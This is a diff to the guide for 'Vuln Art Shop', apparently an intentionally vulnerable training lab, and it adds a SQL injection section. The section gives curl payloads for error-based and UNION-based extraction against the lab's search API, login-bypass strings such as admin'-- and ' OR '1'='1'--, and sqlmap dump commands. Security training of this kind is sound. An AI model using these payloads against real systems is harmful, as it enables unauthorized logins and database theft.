@@ -85,6 +85,8 @@ By completing all challenges in Vuln Art Shop, you will learn:
 - **Privilege Escalation**: Chaining IDOR vulnerabilities to gain admin access
 - **Virtual Host Enumeration**: Discovering subdomains and internal services
 - **Error-Based Information Disclosure**: Extracting data from error messages
+- **SQL Injection**: Real UNION-based and error-based injection exploitation
+- **Authentication Bypass**: Exploiting SQL injection to bypass login controls
 - **Multi-Step Exploitation**: Combining multiple vulnerabilities in sequence
 
 ### ⚫ Expert Skills
@@ -326,6 +328,19 @@ Once you find the flag (format: `FLAG{...}`), you can submit it:
 3. **Test API error handling**:
    - Send malformed requests to search endpoints
    - Error messages may reveal database structure or flags
+   - **Try SQL injection on the search API**: The search parameter is vulnerable to real SQL injection
+   ```bash
+   # Test for SQL injection
+   curl 'http://vulnart.local/api/v2/search?q=\''
+   curl 'http://vulnart.local/api/v2/search?q=test'\'' UNION SELECT id, eventType, message, metadata, \'\', 0, 0, \'\', 1, 1, 0 FROM HiddenLog--'
+   ```
+   - **Try SQL injection on the login**: The username field is vulnerable to auth bypass
+   ```bash
+   # Authentication bypass
+   curl -X POST http://vulnart.local/api/auth/login \
+     -H 'Content-Type: application/json' \
+     -d '{"username": "curator_mike\'--", "password": "anything"}'
+   ```
 
 4. **Connect the dots**:
    - Information from one vulnerability helps exploit another
@@ -486,7 +501,49 @@ curl -s http://vulnart.local/api/debug/env | jq '.environment | to_entries[] | s
 - Test race conditions on time-sensitive operations
 - Question assumptions (can I bid $0? rent for 9999 days?)
 
-### 4. Security Misconfiguration
+### 4. SQL Injection
+
+**What it is**: User-supplied input is directly interpolated into SQL queries, allowing attackers to read, modify, or delete data from the database.
+
+**Where to find it in Vuln Art Shop**:
+- `/api/v2/search?q=` — UNION-based SQL injection in the search parameter
+- `/api/auth/login` — Authentication bypass via SQL injection in the username field
+
+**How to test for it**:
+```bash
+# Step 1: Error-based reconnaissance — trigger a SQL error
+curl 'http://vulnart.local/api/v2/search?q=\''
+# Response reveals: database type, table names, column names
+
+# Step 2: UNION-based extraction — pull data from other tables
+curl 'http://vulnart.local/api/v2/search?q=\' UNION SELECT id, eventType, message, metadata, \'\', 0, 0, \'\', 1, 1, 0 FROM HiddenLog--'
+# Response includes: hidden log entries with flag hints
+
+# Step 3: Authentication bypass — login as any user
+curl -X POST http://vulnart.local/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "curator_mike\'--", "password": "anything"}'
+# Response: successful login as admin without knowing the password
+```
+
+**Types of SQL injection in Vuln Art Shop**:
+| Type | Endpoint | Payload |
+|------|----------|--------|
+| Error-based | /api/v2/search?q= | Single quote triggers error with schema info |
+| UNION-based | /api/v2/search?q= | UNION SELECT extracts data from any table |
+| Auth bypass | /api/auth/login | username=admin'-- bypasses password check |
+| Tautology | /api/auth/login | username=' OR '1'='1'-- returns first user |
+
+**Automation with sqlmap**:
+```bash
+sqlmap -u 'http://vulnart.local/api/v2/search?q=test' --dbs
+sqlmap -u 'http://vulnart.local/api/v2/search?q=test' -D main -T HiddenLog --dump
+sqlmap -u 'http://vulnart.local/api/auth/login' --method=POST \
+  --data='{"username":"test","password":"test"}' \
+  -H 'Content-Type: application/json' -p username
+```
+
+### 5. Security Misconfiguration
 
 **What it is**: Default or insecure configurations left in production.
 
@@ -503,7 +560,7 @@ curl -s http://vulnart.local/api/debug/env | jq '.environment | to_entries[] | s
 - Test error handling with malformed input
 - Verify security headers are present
 
-### 5. Virtual Host Discovery
+### 6. Virtual Host Discovery
 
 **What it is**: Multiple websites hosted on the same server, some not publicly known.
 
